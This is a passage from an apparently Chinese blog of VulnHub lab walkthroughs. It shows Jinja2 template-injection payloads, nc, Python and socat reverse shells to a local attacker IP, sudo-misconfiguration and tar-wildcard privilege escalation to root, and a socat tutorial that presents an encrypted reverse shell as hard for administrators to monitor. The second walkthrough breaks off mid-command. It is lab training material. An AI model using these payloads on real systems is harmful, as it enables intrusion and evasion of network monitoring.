&lt;p&gt;&lt;code&gt;http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1266.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 nc 来反弹 shell：&lt;br&gt;
 &lt;code&gt;http://192.168.31.17:5000/sh4d0w\$s?&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[]%27os%27].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1267.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;拿到 webshell 之后就是对其进行输出一个标准的 shell，就不多说了&lt;/p&gt;
&lt;h3 id=&#34;socat反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat反弹shell&#34;&gt;#&lt;/a&gt; socat 反弹 shell&lt;/h3&gt;
&lt;p&gt;查看 sudo -l 时，看到可以无密码执行 kori 下的一个命令&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;先无脑用 python 3 尝试一下能否反弹 shell 出来&lt;br&gt;
 &lt;code&gt;sudo -u kori /bin/php /home/kori/jail.php python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31. 99 &amp;quot;,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;反弹失败了，查看 /home/kori/jail.php 文件，发现在 jail.php 文件中基本上能反弹 shell 的命令都给过滤掉了，包括一些特殊字符都不能在使用，我们能否绕过这些过滤信息，一旦绕过过滤，我们所输入的命令就会被执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1268.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;发现服务器上是存在 socat 命令的，socat 可以算做是高级一点的 nc，并且反弹 shell 的时候只需要分号不需要其他的特殊符号的参与，后面详细介绍 socat 的使用方法，这里先把 shell 反弹出来&lt;br&gt;
 &lt;code&gt;nc - lvvp 3335&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;sudo -u kori /bin/php /home/kori/jail.php socat exec:&#39;sh&#39;,pty,stderr,setsid,sigint,sane&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;tcp:192.168.31.99:4445&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1270.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反弹后同样先获取一个标准的 tty，查看权限设置时看到了一条命令，可调用 irida 用户用 cp 命令将其用户目录下的 irida.apk 文件拷贝到 kori 下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1271.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;权限设置错误&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限设置错误&#34;&gt;#&lt;/a&gt; 权限设置错误&lt;/h3&gt;
&lt;p&gt;直接执行这条命令，看会有什么样的回显产生&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk&lt;/code&gt; &lt;br&gt;
 发现权限不允许，通过 chmod o+w . 给其他用户添加写权限，再次复制成功了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1272.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看此文件的权限时，发现还是属于 irida 用户，如果我们先用 kori 用户创建 irida.apk 的文件，再将 irida 用户目录下的 apk 文件复制过来，那么最后得到的文件的权限就会归属于 kori 用户&lt;br&gt;
 &lt;code&gt;rm - f irida.apk;touch irida.apk; chmod +777 irida.apk&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1273.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;apk反编译&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apk反编译&#34;&gt;#&lt;/a&gt; apk 反编译&lt;/h3&gt;
&lt;p&gt;将 apk 发送到一台 windows 虚拟机或者主机上，尝试反编译&lt;br&gt;
 &lt;code&gt;scp irida.apk administrator@192.168.31.16:/E:/Desktop&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1274.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 github 上搜索得到 AndroidKiller 一款用来反编译 apk 的工具&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1275.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用此工具打开 apk 文件即可自动的进行反编译&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1276.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过一段时间后，apk 被成功反编译为了 jar 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1277.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;而 jar 文件是可以直接采用 IDEA 打开的，但是打开之后是不允许编辑的，可以借助 IDEA 工具对其源码进行审计，然后复制出关键的信息进行利用&lt;/p&gt;
&lt;h3 id=&#34;idea反编译jar&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#idea反编译jar&#34;&gt;#&lt;/a&gt; IDEA 反编译 jar&lt;/h3&gt;
&lt;p&gt;在 jar 文件中找到一个登陆数据，调用了一个方法，将该方法的输出结果作为登陆进去的密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1278.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;拉取这部分的代码，执行构造的代码，反向输出原有的密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1279.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到密码 eye.of.the.tiger (), 并且可依靠此密码登陆到 irida 用户下&lt;/p&gt;
&lt;p&gt;找到 irida 用户的一条用户权限设置错误，可调用 python3 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1vcmFzLXBrNmhnNDVxLnB5&#34;&gt;执行 oras.py&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1280.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是现在的问题是没有权限去查看 oras.py 到底有什么内容，只能根据执行后的回显结果进行猜测&lt;br&gt;
 &lt;code&gt;sudo /usr/bin/python3 /root/oras.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1281.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要输入一个参数，并且错误信息提示我们需要输入的是一个十六进制的数据&lt;/p&gt;
&lt;h3 id=&#34;python输出hex&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python输出hex&#34;&gt;#&lt;/a&gt; python 输出 hex&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;用 python3 调用十六进制，将 whoami 编码为十六进制&lt;br&gt;
 python3 -c “print (b&amp;quot;whoami”.hex ())&amp;quot; | sudo python3 /root/oras.pyi&lt;br&gt;
python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 在命令输出&lt;br&gt;
一个 whoami 的十六进制数据并将这个数据作为后面那个脚本的输入，字符串中的’b’字符前缀使变量成为字节类型。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1282.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里输了一些命令之后命令被挤掉了，说明 stty 设置的不够严谨，重新 reset 一下，stty 如何设置前面有介绍这里就直接利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1283.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;上述命令因为符号转义问题即括号的书写不规范导致命令错误，这里不确定自己的命令是否正确，就分为了两部执行，先打印出十六进制，运行后面的脚本，并把十六进制数据作为后者的输入，正常的写法为&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python3 -c &amp;quot;print(b\&amp;quot;whoami\&amp;quot;.hex())&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1284.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 whoami 的十六进制数据 77686f616d69 带入脚本中执行，看到报错代码内容为 exec（name），而 print (exec (‘whoami’)) 是错误的语法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1285.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;py-exec执行命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py-exec执行命令&#34;&gt;#&lt;/a&gt; py exec 执行命令&lt;/h3&gt;
&lt;p&gt;搜索 python 的 exec 如何执行，在下图的示例中，可见需要在 exec 中添加的内容为 print（‘Hello World’）的形式&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1286.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同样先把 print (‘Hello World’) 转为为十六进制&lt;br&gt;
 &lt;code&gt;python3 -c &amp;quot;print(b\&amp;quot;print(&#39;Hello World&#39;)\&amp;quot;.hex())&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1287.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将得到的数据 7072696e74282748656c6c6f20576f726c642729 带入到脚本中执行，执行成功，并且打印出来了 Hello World&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1288.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 python 命令行引入 os 包，以 os 包下的 system 执行系统命令&lt;br&gt;
 &lt;code&gt;python3 -c &amp;quot;print(b\&amp;quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)\&amp;quot;.hex())&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1289.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo python3 /root/oras.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5f5f696d706f72745f5f28276f7327292e73797374656d282777686f616d692729&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1290.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过nc将root的shell反弹出来&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;print(b\&amp;quot;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;nc -e /bin/bash 192.168.31.99 4446&amp;#x27;)\&amp;quot;.hex())&amp;quot; | sudo python3 /root/oras.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5f5f696d706f72745f5f28276f7327292e73797374656d28276e63202d65202f62696e2f62617368203139322e3136382e33312e393920343434362729&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1291.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 最终拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;socat通信&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat通信&#34;&gt;#&lt;/a&gt; socat 通信&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;socat 功能灵活，除了完成 nc 能完成的所有任务外，还有很多实用的用法：&lt;br&gt;
基本命令就是：socat [参数] &amp;lt; 地址 1 &amp;gt; &amp;lt; 地址 2 &amp;gt;&lt;br&gt;
 使用 socat 需要提供两个地址，socat 会将这两个地址的数据流串起来，把第左边地址的输出数据传给右边，同时又把右边输出的数据传到左边。Socat 的主要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、TCP、UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket 等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;socat - - &lt;/code&gt;  把标准输入和标准输出对接，输入什么显示什么&lt;br&gt;
就会对接标准输入和标准输出，类似无参数的 cat 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1292.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;网络测试 两台主机到底网络能否联通：&lt;br&gt;
 &lt;code&gt;socat - TCP-LISTEN:8080&lt;/code&gt;  终端 1 上启动 server 监听 TCP&lt;br&gt;
 &lt;code&gt;socat - TCP:localhost:8080&lt;/code&gt;  终端 2 上启动 client 链接 TCP&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1293.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;服务端在 TCP-LISTEN 地址后面加了 fork 的参数后，就能同时应答多个链接过来的客户端，每个客户端会 fork 一个进程出来进行通信，加上 reuseaddr 可以防止链接没断开玩无法监听的问题。&lt;br&gt;
 &lt;code&gt;socat - TCP-LISTEN:8080,fork,reuseaddr&lt;/code&gt;  # 终端 1 上启动 server&lt;br&gt;
 &lt;code&gt;socat - TCP:localhost:8080&lt;/code&gt;  # 终端 2 上启动 client&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1294.png&#34; width=&#34;510&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;socat 也可以用 UDP 进行通信&lt;br&gt;
 &lt;code&gt;socat - UDP-LISTEN:8080&lt;/code&gt;  # 终端 1 上启动 server 监听 UDP&lt;br&gt;
 &lt;code&gt;socat - UDP:localhost:8080&lt;/code&gt;  # 终端 2 上启动 client 链接 UDP&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1295.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;socat-端口转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat-端口转发&#34;&gt;#&lt;/a&gt; socat 端口转发&lt;/h3&gt;
&lt;p&gt;在主机上监听 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，同时在远程机器上开启一个 web 界面：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1296.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用以下命令，访问 127.0.0.1 的流量都转发到了 1.117.52.219 的 8080 上了&lt;br&gt;
 &lt;code&gt;socat TCP-LISTEN:8080,fork,reuseaddr TCP:1.117.52.219:80&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1297.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;socat 加上 fork 以后，每次 accept 一个链接都会 fork 出一份来不影响接收其他的新连接，这样 socat 就可以当一个端口转发服务，一直启动在那里。&lt;/p&gt;
&lt;p&gt;本地转发，在 80 端口起一个 python 的 http.server 服务&lt;br&gt;
将 80 端口的服务转发至本地的 8888 端口&lt;br&gt;
 &lt;code&gt;socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:80&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1298.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1299.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;日志信息输出&lt;br&gt;
 &lt;code&gt;socat -d -d tcp-listen:1234 -&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;socat -d -d tcp-connect:127.0.0.1:1234 -&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1594.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;前面两个连续的 -d -d 代表调试信息的输出级别。&lt;/p&gt;
&lt;h3 id=&#34;socat-文件传输&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat-文件传输&#34;&gt;#&lt;/a&gt; socat 文件传输&lt;/h3&gt;
&lt;p&gt;采用 FILE 协议将文件传输到另一台机器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;socat -d -d tcp-listen:1234 OPEN:filetransfer.txt,create&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;sudo socat -d -d tcp-connect:127.0.0.1:1234 FILE:/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1300.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;socat-规避防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat-规避防火墙&#34;&gt;#&lt;/a&gt; socat 规避防火墙&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;socat 的强大之一在于支持 openssl、可以用于 openssl 连接，这样获取到的反弹 shell 将对网络管理员造成很大的排查难度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;创建一个将用于加密连接的证书，我们可以为此使用自签名证书&lt;br&gt;
 &lt;code&gt;openssl req -newkey rsa: 2048 - nodes -keyout cert.key -x509 -days 1000 - out cert.crt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1301.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这将会产生两个文件，cert.crt 和 cert.key，需要组合为 pem 文件&lt;br&gt;
 &lt;code&gt;cat cert.key cert.crt &amp;gt; sslkey.pem&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1302.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;现在我们就得到了一个可以用来连接 socat 加密的证书&lt;br&gt;
当我们使用加密证书的时候，就不再用 tcp 监听链接，而是用的 openssl 监听，&lt;br&gt;
 因为没有使用有效证书需要添加 verify 标志禁用连接端的证书链校验&lt;br&gt;
 &lt;code&gt;socat -d -d openssl-listen:1234,cert=sslkey.pem,verify=0 -&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;socat -d -d openssl-connect:127.0.0.1: 1234 ,verify=0 exec:/bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1303.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这是一个无法或者很难被网络管理员监控的加密链接，这使得网络管理员更难分析我们的数据&lt;/p&gt;
&lt;h3 id=&#34;socat-远程登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socat-远程登录&#34;&gt;#&lt;/a&gt; socat 远程登录&lt;/h3&gt;
&lt;p&gt;一个重要的地址类型就是 EXEC 可以执行程序并且把输入输出和另外一个地址串起来，比如服务端：&lt;br&gt;
 &lt;code&gt;socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;socat -d -d - TCP:localhost:8080&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1595.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;完善一点可以加些参数：(正)&lt;br&gt;
socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr&lt;br&gt;
socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP:localhost:8080&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1304.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;也可以用如下的参数：（反）&lt;br&gt;
socat -d -d exec:‘bash -li’,pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080&lt;br&gt;
socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP-LISTEN:8080&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/138%20BLUESOMKE/</guid>
            <title>VULNHUB 38 BLUESOMKE</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/138%20BLUESOMKE/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZXNtb2tlLWRldnJhbmRvbTIsNjc4Lw==&#34;&gt;https://www.vulnhub.com/entry/bluesmoke-devrandom2,678/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92aXNoYWwtY2hhbmRhay5tZWRpdW0uY29tL3Z1bG5odWItYmx1ZXNtb2tlLWRldnJhbmRvbTItd3JpdGUtdXAtYTY2OWU3MzgyYmEw&#34;&gt;https://vishal-chandak.medium.com/vulnhub-bluesmoke-devrandom2-write-up-a669e7382ba0&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BLUESOMKE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1014.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip:192.168.31.84 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;tar-通配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-通配符提权&#34;&gt;#&lt;/a&gt; tar 通配符提权&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1015.png&#34;&gt;
&lt;p&gt;对方服务器会执行我们上传的 tar 文件，通过上传恶意 tar 文件反弹 shell&lt;/p&gt;
&lt;p&gt;准备反弹 shell 的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4cC5zaA==&#34;&gt;exp.sh&lt;/span&gt; 文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; exp.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.78/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1016.png&#34; width=&#34;388&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里的 ip 我做了别名并且加入到了环境变量里边，对 ifconfig 的结果做了过滤，所以有这么一个奇怪的命令&lt;/p&gt;
&lt;p&gt;tar 通配符提权如下，对方去使用 tar 的时候会执行我们的 exp.sh 从而将 shell 反弹出来&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh exp.sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -cf tar_shell.tar ./*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;--checkpoint[=NUMBER]每第 NUMBER 条记录显示进度消息（默认为 10 ）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;--checkpoint-action=ACTION在每个检查点上执行 